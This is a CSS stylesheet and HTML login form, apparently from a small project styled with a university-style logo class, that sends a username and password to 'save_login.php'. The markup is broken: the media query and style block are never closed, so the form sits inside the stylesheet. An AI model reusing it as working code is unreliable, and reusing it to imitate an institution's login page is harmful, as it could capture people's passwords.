<style>
body {
  margin: 0;
  font-family: Georgia, serif;
  background-color: #f2f2f2;
}

/* HEADER CONTAINER */
.Header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap; 
  border-bottom: 3px solid black;
  padding: 10px 3%;
  background-color: #fff;
}

/* LOGO */
.UofC-Logo {
  width: 180px;
  height: auto;
}

/* NAV LINKS */
nav {
  display: flex;
  flex-wrap: wrap;
  gap: 15px;
}

/* BUTTON LINKS */
a {
  padding: 8px 16px;
  border-radius: 8px;
  font-family: inherit;
  text-decoration: none;
  text-align: center;
  color: #000;
  background-color: #fff;
  border: white 2px solid;
  cursor: pointer;
  transition: background-color 0.5s ease, color 0.5s ease, border-color 0.5s ease;
  width: fit-content;
}

a:hover {
  background-color: #ee0e2c;
  color: white;
}

/* LOGIN / SIGNUP STACK */
.Login-Signup {
  display: flex;
  flex-direction: column;
  gap: 5px;
}

.Login:hover,
.Signup:hover {
  background-color: white;
  border: 2px solid #ee0e2c;
  color: #ee0e2c;
  text-decoration: underline;
}

/* LOGIN BOX */
.login-container {
  width: 380px;
  background: white;
  margin: 80px auto;
  padding: 30px 40px;
  border-radius: 12px;
  box-shadow: 0px 0px 15px rgba(0,0,0,0.15);
}

.login-container h2 {
  text-align: center;
  margin-bottom: 25px;
  border-bottom: 2px solid black;
  display: inline-block;
  padding-bottom: 3px;
}

input[type="text"],
input[type="password"] {
  width: 100%;
  padding: 12px;
  margin: 10px 0 20px;
  border: 2px solid #ccc;
  border-radius: 8px;
  font-size: 16px;
  box-sizing: border-box;
}

input[type="submit"] {
  width: 100%;
  padding: 12px;
  background-color: #ee0e2c;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 18px;
  cursor: pointer;
  transition: background-color 0.4s ease;
}

input[type="submit"]:hover {
  background-color: #c50c24;
}

/* RESPONSIVE */
@media (max-width: 700px) {
  .Header {
    flex-direction: column;
    align-items: flex-start;
  }

  nav {
    flex-direction: column;
    width: 100%;
    margin-top: 10px;
  }

  .Login-Signup {
    flex-direction: row;
    width: 100%;
    justify-content: flex-start;
    margin-top: 10px;
  }

<!-- LOGIN FORM -->
<div class="login-container">
  <h2>Log In</h2>

  <form action="save_login.php" method="POST">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" required>

    <label for="password">Password</label>
    <input type="password" id="password" name="password" required>

    <input type="submit" value="Log In">
  </form>
</div>
